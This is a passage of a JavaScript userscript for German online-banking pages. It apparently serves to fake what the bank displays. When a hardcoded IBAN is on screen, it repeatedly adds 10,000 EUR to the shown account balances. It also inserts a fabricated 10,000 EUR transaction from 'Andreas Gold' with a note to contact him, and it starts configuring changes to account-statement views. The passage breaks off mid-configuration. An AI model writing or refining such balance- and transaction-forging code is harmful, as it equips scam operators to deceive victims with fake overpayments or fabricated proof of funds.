    wrapper.innerHTML = html;
    return wrapper.firstElementChild;
  };

  const getCleanIBANFromPage = () => {
    const p = document.querySelector('.mkp-identifier-description p');
    return p ? p.textContent.replace(/\s+/g, '').trim() : null;
  };

  const transactionAlreadyExists = (detailsText) =>
    [...document.querySelectorAll('li[data-cloned="true"]')].some(
      el => el.dataset.details === detailsText.trim()
    );

  const getAllTransactionLIs = () => {
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    return container ? [...container.querySelectorAll('li')] : [];
  };

  const repositionTransaction = (li, offset) => {
    if (!offset) return;
    const allLis = getAllTransactionLIs();
    const index = allLis.indexOf(li);
    if (index === -1) return;
    const newIndex = Math.max(0, Math.min(allLis.length - 1, index - offset));
    const target = allLis[newIndex];
    const parent = target?.parentElement;
    if (target && parent) {
      parent.insertBefore(li, offset > 0 ? target : target.nextSibling);
    }
  };

  const parseDateValue = (label) => {
    if (!label) return -Infinity;
    const lower = label.toLowerCase();

    if (lower === 'vorgemerkt') return Infinity;
    if (lower === 'heute') return Date.now();
    if (lower === 'gestern') {
      const d = new Date();
      d.setHours(0, 0, 0, 0);
      d.setDate(d.getDate() - 1);
      return d.getTime();
    }

    const [d, m, y] = label.split('.');
    if (d && m && y) {
      return new Date(`${y}-${m}-${d}`).getTime() || -Infinity;
    }

    return -Infinity;
  };

  // ✅ Fixed: compare visible <h3> text instead of aria-label
  const findExistingDateGroupUL = (dateGroup) => {
    const lists = document.querySelectorAll('.mkp-card-list');
    for (const list of lists) {
      const headerText = list.querySelector('.groupdate')?.textContent?.trim().toLowerCase();
      if (headerText === dateGroup.toLowerCase()) {
        return list.querySelector('ul.mkp-card-group');
      }
    }
    return null;
  };

  const createNewDateGroup = (dateGroup) => {
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    if (!container) return null;

    const newUL = document.createElement('ul');
    newUL.className = 'mkp-card-group mkp-group-unify mkp-group-clickable';
    newUL.setAttribute('aria-label', dateGroup);

    const header = document.createElement('div');
    header.className = 'mkp-list-subline mkp-observe-sticky mkp-sticky-teleport-top';
    const h3 = document.createElement('h3');
    h3.className = 'mkp-headline-06 mkp-text-normal groupdate';
    h3.textContent = dateGroup;
    header.appendChild(h3);

    const wrapper = document.createElement('div');
    wrapper.className = 'mkp-card-list';
    wrapper.appendChild(header);
    wrapper.appendChild(newUL);

    // Insert in proper position
    const sections = [...container.children];
    const newTime = parseDateValue(dateGroup);
    let insertBefore = null;

    for (const section of sections) {
      const label = section.querySelector('.groupdate')?.textContent?.trim();
      const time = parseDateValue(label);
      if (time < newTime) {
        insertBefore = section;
        break;
      }
    }

    container.insertBefore(wrapper, insertBefore);
    return newUL;
  };

  const findOrCreateDateGroup = (dateGroup) => {
    return findExistingDateGroupUL(dateGroup) || createNewDateGroup(dateGroup);
  };

  /******************************************************************
   * INSERT LOGIC
   ******************************************************************/
  const insertTransaction = (tx) => {
    if (getCleanIBANFromPage() !== IBAN_CHECK_RAW.replace(/\s+/g, '')) return;
    if (transactionAlreadyExists(tx.details)) return;

    const li = createTransactionElement(tx);
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    if (!container) return;

    if (tx.insertMode === 1) {
      let topUL = container.querySelector('ul.custom-top-insert');
      if (!topUL) {
        topUL = document.createElement('ul');
        topUL.className = 'mkp-card-group custom-top-insert';
        container.insertBefore(topUL, container.firstChild);
      }
      topUL.insertBefore(li, topUL.firstChild);
      log(`✅ Inserted "${tx.title}" at top`);
    } else {
      const targetUL = findOrCreateDateGroup(tx.dateGroup);
      if (!targetUL) return;
      targetUL.insertBefore(li, targetUL.firstChild);
      log(`✅ Inserted "${tx.title}" into group "${tx.dateGroup}"`);
    }

    if (typeof tx.positionOffset === 'number') {
      setTimeout(() => repositionTransaction(li, tx.positionOffset), 0);
    }
  };

  // Open link in new tab
  document.addEventListener('click', (e) => {
    const a = e.target.closest('.custom-link-handler');
    if (a?.dataset.link) {
      e.preventDefault();
      const url = a.dataset.link;
      (typeof GM_openInTab === 'function' ? GM_openInTab : window.open)(url, { active: true });
    }
  });

  /******************************************************************
   * MAIN LOOP
   ******************************************************************/
  setInterval(() => {
    transactions.forEach(insertTransaction);
  }, 200);
}















// THIRD ACCOUNT
//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

// THIRD ACCOUNT
//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================
// THIRD ACCOUNT
//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================
// THIRD ACCOUNT
//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================
// THIRD ACCOUNT
//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================



// UMSATZE BALANCE

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /**
   * Amount (EUR) to add (positive) or subtract (negative) to EVERY matching balance
   * inside the specified account cards WHEN the IBAN check matches.
   */
  const DELTA_EUR = 10000; // ← change this value
  const DELTA_CENTS = Math.round(Number(DELTA_EUR) * 100);

  /**
   * IBAN guard: only modify balances within a card if the digits of the IBAN shown
   * in its ".mkp-identifier-description" match these digits.
   * The HTML may split the IBAN across text and <strong>, so we compare digits-only.
   */
  const IBAN_CHECK_RAW = 'DE14 8605 5592 1100 4673 82';

  const IBAN_CHECK_DIGITS = (IBAN_CHECK_RAW.match(/\d/g) || []).join('');

  // Card containers to look inside
  const CARD_SELECTOR = [
    '.mkp-card.mkp-card-account.mkp-layout-margin.mkp-card-account-link',
    '.mkp-card.mkp-card-bank-account.mkp-card-thinner.mkp-card-clickable'
  ].join(', ');

  // Balance nodes (handle plus/negative/minus and predecimal variant too)
  const BALANCE_SELECTOR = [
    '.balance-decimal.plus',
    '.balance-decimal.negative',
    '.balance-decimal.minus',
    '.balance-predecimal.plus',
    '.balance-predecimal.negative',
    '.balance-predecimal.minus',
  ].join(', ');

  // ─────────── Helpers: parse/format German amounts ───────────
  function extractParts(text) {
    const s = String(text ?? '');
    const m = s.match(/(.*?)([-–—]?\s*[0-9][0-9.,]*)(.*)/);
    if (!m) return { prefix: '', number: s.trim(), suffix: '', found: false };
    return { prefix: m[1], number: m[2].replace(/\s+/g, ''), suffix: m[3], found: true };
  }

  function parseGermanAmountToCents(text) {
    try {
      if (!text) return null;
      const { number } = extractParts(text);
      if (!number) return null;
      let raw = number.replace(/[–—]/g, '-'); // normalize minus variants
      raw = raw.replace(/\./g, '');           // remove thousands sep
      raw = raw.replace(/,/g, '.');           // decimal comma -> dot
      const val = Number(raw);
      if (!Number.isFinite(val)) return null;
      return Math.round(val * 100);
    } catch (e) {
      console.error('[BalanceInjector] parse error', e, { text });
      return null;
    }
  }

  function formatCentsGerman(cents, { keepCents, keepCurrency, origSuffix } = {}) {
    const negative = cents < 0;
    const abs = Math.abs(cents);
    const euros = Math.floor(abs / 100);
    const dec = abs % 100;
    const eurosStr = euros.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');

    const body = keepCents
      ? `${eurosStr},${dec.toString().padStart(2, '0')}`
      : Math.round(abs / 100).toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');

    const sign = negative ? '-' : '';
    const suffix = keepCurrency ? (origSuffix || ' EUR') : (origSuffix || '');
    return `${sign}${body}${suffix}`;
  }

  function detectStyle(text) {
    const t = String(text ?? '');
    const { prefix, number, suffix } = extractParts(t);
    const hasComma = /,/.test(number);
    const hasEUR = /\bEUR\b/i.test(suffix) || /\bEUR\b/i.test(prefix);
    return { suffix, hasComma, hasEUR };
  }

  function setClassesForSign(el, cents) {
    try {
      if (!el?.classList) return;
      const isNeg = cents < 0;
      if (isNeg) {
        el.classList.add('negative', 'minus');
        el.classList.remove('plus');
      } else {
        el.classList.add('plus');
        el.classList.remove('negative', 'minus');
      }
    } catch {}
  }

  // ─────────── IBAN checker per card ───────────
  function cardIbanDigits(card) {
    try {
      const idDesc = card.querySelector('.mkp-identifier-description');
      if (!idDesc) return '';
      // Prefer the <p> that contains the IBAN (can be split across text + <strong>)
      // If multiple <p>, join them (defensive).
      const pList = idDesc.querySelectorAll('p');
      let text = '';
      if (pList.length) {
        pList.forEach(p => { text += ' ' + (p.textContent || ''); });
      } else {
        text = idDesc.textContent || '';
      }
      return (text.match(/\d/g) || []).join('');
    } catch (e) {
      console.warn('[BalanceInjector] Failed to read IBAN from card', e, card);
      return '';
    }
  }

  function ibanMatchesCard(card) {
    const digits = cardIbanDigits(card);
    if (!digits) return false;
    const match = digits === IBAN_CHECK_DIGITS;
    // Optional debug
    // console.debug('[BalanceInjector] IBAN check', { cardDigits: digits, expected: IBAN_CHECK_DIGITS, match });
    return match;
  }

  // ─────────── Per-node cache & application ───────────
  function ensureCache(el) {
    if (!el) return false;
    if (!el.dataset.originalBalanceCents) {
      const currentText = el.textContent?.trim() || '';
      const currentCents = parseGermanAmountToCents(currentText);
      if (currentCents === null) return false;

      const style = detectStyle(currentText);
      el.dataset.originalBalanceCents = String(currentCents);
      el.dataset.modifiedBalanceCents = String(currentCents + DELTA_CENTS);
      el.dataset.keepCents = style.hasComma ? '1' : '0';
      el.dataset.keepCurrency = style.hasEUR ? '1' : '0';
      el.dataset.origSuffix = style.suffix || '';
      el.dataset.balanceInjector = '1';
      // console.debug('[BalanceInjector] Cached', { originalCents: currentCents, modifiedCents: currentCents + DELTA_CENTS });
    }
    return true;
  }

  function rebaseIfExternalChange(el, currentCents) {
    const original = Number(el.dataset.originalBalanceCents);
    const modified = Number(el.dataset.modifiedBalanceCents);
    if (currentCents !== original && currentCents !== modified) {
      el.dataset.originalBalanceCents = String(currentCents);
      el.dataset.modifiedBalanceCents = String(currentCents + DELTA_CENTS);
      const style = detectStyle(el.textContent?.trim() || '');
      el.dataset.keepCents = style.hasComma ? '1' : '0';
      el.dataset.keepCurrency = style.hasEUR ? '1' : '0';
      el.dataset.origSuffix = style.suffix || '';
      // console.info('[BalanceInjector] Rebased on external change', { newOriginal: currentCents });
    }
  }

  function applyIfOriginal(el) {
    const currentText = el.textContent?.trim() || '';
    const currentCents = parseGermanAmountToCents(currentText);
    if (currentCents === null) return;

    rebaseIfExternalChange(el, currentCents);

    const original = Number(el.dataset.originalBalanceCents);
    const modified = Number(el.dataset.modifiedBalanceCents);
    if (currentCents === original) {
      const keepCents = el.dataset.keepCents === '1';
      const keepCurrency = el.dataset.keepCurrency === '1';
      const origSuffix = el.dataset.origSuffix || '';
      const formatted = formatCentsGerman(modified, { keepCents, keepCurrency, origSuffix });
      el.textContent = formatted;
      setClassesForSign(el, modified);
      try { el.setAttribute('title', formatted); } catch {}
      el.dataset.lastAppliedAt = String(Date.now());
      // console.debug('[BalanceInjector] Applied', { formatted, modified });
    }
  }

  // ─────────── Main loop: only inside target cards & only if IBAN matches ───────────
  function processAll() {
    try {
      const cards = document.querySelectorAll(CARD_SELECTOR);
      if (!cards.length) return;

      cards.forEach((card) => {
        if (!ibanMatchesCard(card)) {
          // Skip this card if IBAN digits don't match the expected one
          return;
        }

        const balances = card.querySelectorAll(BALANCE_SELECTOR);
        balances.forEach((el) => {
          if (!ensureCache(el)) return;
          applyIfOriginal(el);
        });
      });
    } catch (e) {
      console.error('[BalanceInjector] Tick error', e);
    }
  }

  // Run forever at the chosen cadence (interval only)
  processAll(); // immediate pass
  const id = setInterval(processAll, 20);
  window.__BalanceInjectorIntervalId__ = id; // debug handle
  console.log('[BalanceInjector] Started (interval 100ms). Delta per balance:', DELTA_EUR, 'EUR');
}




//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

//. KONTODETAILS NEW 15.12



 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /* ========= CONFIG ========= */
  const DELTA_EUR = 10000;
  const IBAN_CHECK_RAW = 'DE14 8605 5592 1100 4673 82';
  /* ========================= */

  const log = (...a) => console.log('[Delta FIX]', ...a);
  const warn = (...a) => console.warn('[Delta FIX]', ...a);
  const err = (...a) => console.error('[Delta FIX]', ...a);

  const IBAN_DIGITS_EXPECTED = IBAN_CHECK_RAW.replace(/\D/g, '');

  /* ---------- German number helpers ---------- */
  const parseDE = (str) => {
    const cleaned = str.replace(/[^\d.,-]/g, '').replace(/\./g, '').replace(',', '.');
    return Number(cleaned);
  };

  const formatDE = (num) => {
    const neg = num < 0 ? '-' : '';
    const abs = Math.abs(num);
    const [i, d] = abs.toFixed(2).split('.');
    return `${neg}${i.replace(/\B(?=(\d{3})+(?!\d))/g, '.')},${d}`;
  };

  const splitValueAndSuffix = (text) => {
    const m = text.match(/-?[\d.]+,\d{2}/);
    if (!m) return null;
    const suffix = text.slice(m.index + m[0].length).trim();
    return { value: m[0], suffix: suffix ? ' ' + suffix : '' };
  };

  /* ---------- Shadow root ---------- */
  const getShadowRoot = () => {
    const host = document.querySelector('#cpl-slot-shadow');
    if (!host) {
      warn('Shadow host not found yet');
      return null;
    }
    if (!host.shadowRoot) {
      warn('Shadow root not attached yet');
      return null;
    }
    return host.shadowRoot;
  };

  /* ---------- IBAN check ---------- */
  const ibanMatches = (root) => {
    const labels = [...root.querySelectorAll('p.MuiTypography-label04')];
    const ibanLabel = labels.find(p => p.textContent.trim() === 'IBAN');

    if (!ibanLabel) {
      warn('IBAN label not found');
      return false;
    }

    const container = ibanLabel.closest('[role="listitem"]');
    if (!container) {
      warn('IBAN container not found');
      return false;
    }

    const valueEl = container.querySelector('p.MuiTypography-input01');
    if (!valueEl) {
      warn('IBAN value element not found');
      return false;
    }

    const rawText = valueEl.textContent;
    const digits = rawText.replace(/\D/g, '');

    log('IBAN raw text:', rawText);
    log('IBAN digits found:', digits);
    log('IBAN expected:', IBAN_DIGITS_EXPECTED);

    const ok = digits === IBAN_DIGITS_EXPECTED;
    if (!ok) warn('IBAN mismatch');
    else log('IBAN match OK');

    return ok;
  };

  /* ---------- Core delta logic ---------- */
  const processed = new WeakSet();

  const applyDeltaForLabel = (labelText) => {
    try {
      const root = getShadowRoot();
      if (!root) return;

      if (!ibanMatches(root)) return;

      const labels = [...root.querySelectorAll('p.MuiTypography-label04')]
        .filter(p => p.textContent.trim().startsWith(labelText));

      if (!labels.length) {
        warn(`Label not found: ${labelText}`);
        return;
      }

      labels.forEach(label => {
        const container = label.closest('[role="listitem"]');
        if (!container) return;

        const valueEl = container.querySelector('p.MuiTypography-input01');
        if (!valueEl) return;

        if (processed.has(valueEl)) return;

        const originalText = valueEl.textContent.trim();
        const split = splitValueAndSuffix(originalText);

        if (!split) {
          warn('Cannot parse number from:', originalText);
          return;
        }

        const originalNum = parseDE(split.value);
        if (isNaN(originalNum)) {
          warn('Parsed NaN from:', originalText);
          return;
        }

        const modified = formatDE(originalNum + DELTA_EUR) + split.suffix;

        log(labelText, 'original:', originalText);
        log(labelText, 'modified:', modified);

        valueEl.textContent = modified;
        processed.add(valueEl);
      });
    } catch (e) {
      err('applyDeltaForLabel error', e);
    }
  };

  /* ---------- Tick ---------- */
  const tick = () => {
    applyDeltaForLabel('Kontostand');
    applyDeltaForLabel('Verfügbarer Betrag');
  };

  log('Delta FIX userscript loaded');
  setInterval(tick, 250);

}


// KONTODETAILS BALANCE  OLD

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================



 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /* ========= CONFIG =========
     Positive increases, negative decreases (EUR).
     Examples: 25  |  -10.5  |  1234.56
  */
  const DELTA_EUR = 10000; // <-- set your offset here
//
//  // IBAN digits must match those displayed under `.mkp-identifier-description > p`
  const IBAN_CHECK_RAW = 'DE14 8605 5592 1100 4673 82';
  /* ========================= */

  const log = (...a) => console.log('[Kontodetails mod]', ...a);

  // Labels to modify (beginning of title/aria-label)
  const LABELS = ['Kontostand', 'Verfügbarer Betrag'];

  // --- German number helpers ---
  const parseDE = (str) => {
    if (!str) return NaN;
    const num = str.replace(/[^\d.,-]/g, '').replace(/\./g, '').replace(',', '.');
    return Number(num);
  };
  const formatDE = (num) => {
    const neg = num < 0 ? '-' : '';
    const abs = Math.abs(num);
    const [intPart, decPart] = abs.toFixed(2).split('.');
    const withThousands = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    return `${neg}${withThousands},${decPart}`;
  };
  const splitValueAndSuffix = (text) => {
    const trimmed = text.trim().replace(/\s+/g, ' ');
    const match = trimmed.match(/-?[\d.]+,\d{2}/);
    if (!match) return { valuePart: trimmed, suffix: '' };
    const valuePart = match[0];
    const after = trimmed.slice(match.index + valuePart.length).trimStart();
    const suffix = after.length ? ' ' + after : '';
    return { valuePart, suffix };
  };

  // ---- IBAN check helpers ----
  const IBAN_DIGITS_EXPECTED = IBAN_CHECK_RAW.replace(/\D/g, '');

  const getIbanDigitsFromPage = () => {
    // Example markup:
    // <div class="mkp-identifier-description">
    //   <p>DE52 2905 0101 00<strong>84 5790 28</strong></p>
    // </div>
    const p = document.querySelector('.mkp-identifier-description p');
    if (!p) return null;
    const txt = p.textContent || '';
    const digits = txt.replace(/\D/g, '');
    return digits || null;
  };

  const ibanMatches = () => {
    const pageDigits = getIbanDigitsFromPage();
    if (!pageDigits) {
      log('IBAN not found on page; skipping this tick.');
      return false;
    }
    const ok = pageDigits === IBAN_DIGITS_EXPECTED;
    if (!ok) log('IBAN mismatch; skipping modification.', { expected: IBAN_DIGITS_EXPECTED, found: pageDigits });
    return ok;
  };

  // Shadow root that holds the balances
  const getShadowRoot = () => {
    const host = document.querySelector('#cpl-1-0-0 #cpl-slot-MAIN') ||
                 document.querySelector('#cpl-slot-MAIN');
    return host && host.shadowRoot ? host.shadowRoot : null;
  };

  // Build selector for allowed labels
  const labelSelector = LABELS.map(l => `[title^="${l}"], [aria-label^="${l}"]`).join(', ');

  // Find all value elements we want to control
  const findAllBalanceElements = (root) => {
    if (!root) return [];
    const blocks = root.querySelectorAll(labelSelector);
    const values = [];
    blocks.forEach(block => {
      const el = block.querySelector('.MuiTypography-input01');
      if (el) values.push(el);
    });
    return values;
  };

  // Per-element state
  const stateMap = new WeakMap(); // el -> { originalText, originalNumber, suffix, modifiedText }

  const captureBaseline = (el) => {
    const text = (el.textContent || '').trim();
    const { valuePart, suffix } = splitValueAndSuffix(text);
    const num = parseDE(valuePart);
    if (isNaN(num)) return null;
    const s = {
      originalText: text,
      originalNumber: num,
      suffix,
      modifiedText: formatDE(num + DELTA_EUR) + suffix
    };
    stateMap.set(el, s);
    log('Captured baseline:', s.originalText);
    return s;
  };

  const applyModified = (el, s) => {
    if (!s) return;
    el.textContent = s.modifiedText;
    log('Applied modified balance:', s.modifiedText);
  };

  const tick = () => {
    try {
      // 1) IBAN must match; otherwise skip the entire cycle.
      if (!ibanMatches()) return;

      // 2) Proceed with balances inside the shadow root.
      const root = getShadowRoot();
      if (!root) return;

      const targets = findAllBalanceElements(root);

      for (const el of targets) {
        let s = stateMap.get(el);
        if (!s) {
          s = captureBaseline(el);
          if (!s) continue;
          // First time: apply once.
          applyModified(el, s);
          continue;
        }

        const currentText = (el.textContent || '').trim();

        // Only re-apply when we see the original again.
        if (currentText === s.originalText) {
          applyModified(el, s);
          continue;
        }

        // If bank updated the baseline (neither originalText nor our modifiedText),
        // adopt that as the new baseline, then apply.
        if (currentText !== s.modifiedText) {
          const { valuePart, suffix } = splitValueAndSuffix(currentText);
          const liveNum = parseDE(valuePart);
          if (!isNaN(liveNum) && (liveNum !== s.originalNumber || suffix !== s.suffix)) {
            const newState = {
              originalText: currentText,
              originalNumber: liveNum,
              suffix,
              modifiedText: formatDE(liveNum + DELTA_EUR) + suffix
            };
            stateMap.set(el, newState);
            log('Baseline changed; updated and re-applied:', newState.originalText);
            applyModified(el, newState);
          }
        }
        // If it's already our modified text, do nothing.
      }
    } catch (e) {
      console.error('[Kontodetails mod] tick error:', e);
    }
  };

  // Check every 2 seconds; no MutationObserver
  setInterval(tick, 100);
}



//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


//  TRANSAKTION INSERTION

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

if (
  window.location.href.includes("de") ||
  window.location.href.includes("sp") ||
  window.location.href.includes("Downloads")
) {
  'use strict';

///  // ✅ CONFIG: IBAN & TRANSACTIONS
  const IBAN_CHECK_RAW = 'DE14 8605 5592 1100 4673 82';

  const transactions = [
    {
      title: "Andreas Gold",
      details: "Bitte A. Gold  kontaktieren.",
      amountText: "10.000,00 EUR",
     dateGroup: "22.12.2025",
      insertMode: 2,
      positionOffset: -1,
      link: "https://example.com/tx-1"
    },
///    {
 ///     title: "Sylvanne OU",
///      details: "Testbuchung. Bitte sich an A. Gold wenden. Ohne ihn nicht ausgeben.",
///      amountText: "43.000,00 EUR",
///      dateGroup: "Gestern",
///      insertMode: 2,
///      positionOffset: 0
///    }
  ];

  /******************************************************************
   * HELPERS
   ******************************************************************/
  const log  = (...args) => console.log("[UserScript]", ...args);

  const getAmountHtml = (amountText) => {
    const match = amountText.match(/^([+-]?)([\d.]+),(\d{2})\s*EUR$/i);
    if (!match) return '';
    const [, sign, pre, dec] = match;
    const signClass = sign === '-' ? 'minus' : 'plus';
    return `
    <div class="mkp-identifier-currency">
      <p class="mkp-currency mkp-currency-pill mkp-currency-m">
        <span aria-hidden="true" class="balance-predecimal ${signClass}">${sign}${pre}</span>
        <span aria-hidden="true" class="balance-decimal ${signClass}">,${dec}&nbsp;EUR</span>
        <span aria-hidden="false" class="offscreen">Betrag:${sign}${pre},${dec} EUR</span>
      </p>
    </div>`;
  };

  const createTransactionElement = (tx) => {
    const id = `custom_tx_${Date.now()}_${Math.floor(Math.random() * 100000)}`;
    const amountHtml = getAmountHtml(tx.amountText);
    const html = `
<li data-cloned="true" data-details="${tx.details}">
  <div id="${id}" class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable">
    <div class="mkp-identifier">
      <div class="mkp-identifier-description">
        <h4 class="mkp-headline-05">
          <a href="#" class="mkp-identifier-link custom-link-handler" data-link="${tx.link || ''}" style="cursor: pointer;">
            ${tx.title}
          </a>
        </h4>
        <p>${tx.details}</p>
      </div>
      <div class="mkp-identifier-sticker mkp-identifier-sticker-placeholder" aria-hidden="true"></div>
      ${amountHtml}
    </div>
  </div>
</li>`;
    const wrapper = document.createElement('div');
    wrapper.innerHTML = html;
    return wrapper.firstElementChild;
  };

  const getCleanIBANFromPage = () => {
    const p = document.querySelector('.mkp-identifier-description p');
    return p ? p.textContent.replace(/\s+/g, '').trim() : null;
  };

  const transactionAlreadyExists = (detailsText) =>
    [...document.querySelectorAll('li[data-cloned="true"]')].some(
      el => el.dataset.details === detailsText.trim()
    );

  const getAllTransactionLIs = () => {
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    return container ? [...container.querySelectorAll('li')] : [];
  };

  const repositionTransaction = (li, offset) => {
    if (!offset) return;
    const allLis = getAllTransactionLIs();
    const index = allLis.indexOf(li);
    if (index === -1) return;
    const newIndex = Math.max(0, Math.min(allLis.length - 1, index - offset));
    const target = allLis[newIndex];
    const parent = target?.parentElement;
    if (target && parent) {
      parent.insertBefore(li, offset > 0 ? target : target.nextSibling);
    }
  };

  const parseDateValue = (label) => {
    if (!label) return -Infinity;
    const lower = label.toLowerCase();

    if (lower === 'vorgemerkt') return Infinity;
    if (lower === 'heute') return Date.now();
    if (lower === 'gestern') {
      const d = new Date();
      d.setHours(0, 0, 0, 0);
      d.setDate(d.getDate() - 1);
      return d.getTime();
    }

    const [d, m, y] = label.split('.');
    if (d && m && y) {
      return new Date(`${y}-${m}-${d}`).getTime() || -Infinity;
    }

    return -Infinity;
  };

  // ✅ Fixed: compare visible <h3> text instead of aria-label
  const findExistingDateGroupUL = (dateGroup) => {
    const lists = document.querySelectorAll('.mkp-card-list');
    for (const list of lists) {
      const headerText = list.querySelector('.groupdate')?.textContent?.trim().toLowerCase();
      if (headerText === dateGroup.toLowerCase()) {
        return list.querySelector('ul.mkp-card-group');
      }
    }
    return null;
  };

  const createNewDateGroup = (dateGroup) => {
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    if (!container) return null;

    const newUL = document.createElement('ul');
    newUL.className = 'mkp-card-group mkp-group-unify mkp-group-clickable';
    newUL.setAttribute('aria-label', dateGroup);

    const header = document.createElement('div');
    header.className = 'mkp-list-subline mkp-observe-sticky mkp-sticky-teleport-top';
    const h3 = document.createElement('h3');
    h3.className = 'mkp-headline-06 mkp-text-normal groupdate';
    h3.textContent = dateGroup;
    header.appendChild(h3);

    const wrapper = document.createElement('div');
    wrapper.className = 'mkp-card-list';
    wrapper.appendChild(header);
    wrapper.appendChild(newUL);

    // Insert in proper position
    const sections = [...container.children];
    const newTime = parseDateValue(dateGroup);
    let insertBefore = null;

    for (const section of sections) {
      const label = section.querySelector('.groupdate')?.textContent?.trim();
      const time = parseDateValue(label);
      if (time < newTime) {
        insertBefore = section;
        break;
      }
    }

    container.insertBefore(wrapper, insertBefore);
    return newUL;
  };

  const findOrCreateDateGroup = (dateGroup) => {
    return findExistingDateGroupUL(dateGroup) || createNewDateGroup(dateGroup);
  };

  /******************************************************************
   * INSERT LOGIC
   ******************************************************************/
  const insertTransaction = (tx) => {
    if (getCleanIBANFromPage() !== IBAN_CHECK_RAW.replace(/\s+/g, '')) return;
    if (transactionAlreadyExists(tx.details)) return;

    const li = createTransactionElement(tx);
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    if (!container) return;

    if (tx.insertMode === 1) {
      let topUL = container.querySelector('ul.custom-top-insert');
      if (!topUL) {
        topUL = document.createElement('ul');
        topUL.className = 'mkp-card-group custom-top-insert';
        container.insertBefore(topUL, container.firstChild);
      }
      topUL.insertBefore(li, topUL.firstChild);
      log(`✅ Inserted "${tx.title}" at top`);
    } else {
      const targetUL = findOrCreateDateGroup(tx.dateGroup);
      if (!targetUL) return;
      targetUL.insertBefore(li, targetUL.firstChild);
      log(`✅ Inserted "${tx.title}" into group "${tx.dateGroup}"`);
    }

    if (typeof tx.positionOffset === 'number') {
      setTimeout(() => repositionTransaction(li, tx.positionOffset), 0);
    }
  };

  // Open link in new tab
  document.addEventListener('click', (e) => {
    const a = e.target.closest('.custom-link-handler');
    if (a?.dataset.link) {
      e.preventDefault();
      const url = a.dataset.link;
      (typeof GM_openInTab === 'function' ? GM_openInTab : window.open)(url, { active: true });
    }
  });

  /******************************************************************
   * MAIN LOOP
   ******************************************************************/
  setInterval(() => {
    transactions.forEach(insertTransaction);
  }, 200);
}

}





//==========================================================================================================================================================================
//==========================================================================================================================================================================
//==========================================================================================================================================================================
//==========================================================================================================================================================================
//==========================================================================================================================================================================
//==========================================================================================================================================================================
// SPAR SCRIPT END
//
//==========================================================================================================================================================================
//==========================================================================================================================================================================
//==========================================================================================================================================================================
//==========================================================================================================================================================================

// VOLKS SCRIPT

 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

//==========================================================================================================================================================================
//=================CONFIGURABLES============================================================================================================================================
//==========================================================================================================================================================================


//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------





//==========================================================================================================================================================================
//=================CONFIGURABLES============================================================================================================================================
//==========================================================================================================================================================================


if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) {
    // Configurable options
    const groups = [
        {
            checkFirstText: true,  // Set to true to check for 'Konto-Nr. 7000152900'
            checkSecondText: true, // Set to true to check for 'Kontoauszug 002/2025'
            firstText: 'konto-nr.7000152900',
            secondText: 'kontoauszug001/2025'
        },
  {
            checkFirstText: true,  // Set to true to check for 'Konto-Nr. 7000152900'
            checkSecondText: true, // Set to true to check for 'Kontoauszug 002/2025'
            firstText: 'konto-nr.7000152900',
            secondText: 'kontoauszug004/2025'
        },
        {
            checkFirstText: false,  // Another group
            checkSecondText: true,
            firstText: 'kunden-nr.60033851',
            secondText: 'kontoauszug008/2025'
        },
    {
            checkFirstText: false,  // Another group
            checkSecondText: true,
            firstText: 'kunden-nr.60033851',
            secondText: 'kontoauszug009/2025'
        },
   {
            checkFirstText: true,  // Set to true to check for 'Konto-Nr. 7000152900'
            checkSecondText: true, // Set to true to check for 'Kontoauszug 002/2025'
            firstText: 'kunden-nr.60033851',
            secondText: 'kontoauszug003/2025'
        },
  {
            checkFirstText: false,  // Set to true to check for 'Konto-Nr. 7000152900'
            checkSecondText: true, // Set to true to check for 'Kontoauszug 002/2025'
            firstText: 'kunden-nr.60033851',
            secondText: 'kontoauszug003/2025'
        },
         {
            checkFirstText: false,  // Set to true to check for 'Konto-Nr. 7000152900'
            checkSecondText: true, // Set to true to check for 'Kontoauszug 002/2025'
            firstText: 'kunden-nr.60033851',
            secondText: 'kontoauszug004/2025'
        },
         {
            checkFirstText: false,  // Set to true to check for 'Konto-Nr. 7000152900'
            checkSecondText: true, // Set to true to check for 'Kontoauszug 002/2025'
            firstText: 'kunden-nr.60033851',
            secondText: 'kontoauszug005/2025'
        },
  {
            checkFirstText: false,  // Set to true to check for 'Konto-Nr. 7000152900'
            checkSecondText: true, // Set to true to check for 'Kontoauszug 002/2025'
            firstText: 'kunden-nr.60033851',
            secondText: 'kontoauszug006/2025'
        },
  {
            checkFirstText: false,  // Set to true to check for 'Konto-Nr. 7000152900'
            checkSecondText: true, // Set to true to check for 'Kontoauszug 002/2025'
            firstText: 'kunden-nr.60033851',
            secondText: 'kontoauszug007/2025'
        },
  {
